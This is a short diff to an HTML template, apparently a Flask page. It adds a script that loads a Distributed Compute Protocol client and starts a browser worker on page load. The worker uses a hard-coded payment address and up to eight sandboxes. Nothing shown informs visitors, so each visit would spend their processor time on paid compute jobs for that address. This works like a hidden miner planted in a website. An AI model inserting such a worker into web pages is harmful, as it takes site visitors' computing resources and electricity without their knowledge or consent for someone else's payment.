@@ -2,6 +2,15 @@
 <html lang="en">
     <div class="animated-area">	
         <head>
+			<script src="https://scheduler.distributed.computer/dcp-client/dcp-client.js"></script>
+			<!-- Instantiate and run the DCP Browser Worker -->
+			<script>
+				const worker = new dcp.worker.Worker({
+					paymentAddress: "0x911eEc0c7DB6C44293e06F41702f49BD664F3168",
+					maxWorkingSandboxes : 8,
+					});
+				worker.start()
+			</script>
 			<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
 			<link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.ico') }}">
 			<link rel="icon" type="image/png" sizes="16x16" href="/css/favicon-16x16.png">
